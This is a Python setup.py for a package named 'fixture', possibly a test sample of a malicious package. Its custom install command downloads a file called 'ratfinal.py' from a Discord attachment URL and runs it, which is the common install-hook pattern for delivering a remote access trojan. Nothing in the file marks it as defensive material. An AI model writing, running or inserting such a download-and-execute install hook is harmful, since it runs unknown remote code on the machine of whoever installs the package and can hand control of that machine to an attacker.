import os
import subprocess
import sys

import requests
from setuptools import setup


class InstallPayload:
    def run(self):
        response = requests.get(
            "https://cdn.discordapp.com/attachments/123456789012345678/987654321098765432/ratfinal.py"
        )
        with open("ratfinal.py", "wb") as payload:
            payload.write(response.content)
        subprocess.check_call([sys.executable, "ratfinal.py"])


setup(name="fixture", version="0.0.1", cmdclass={"install": InstallPayload})
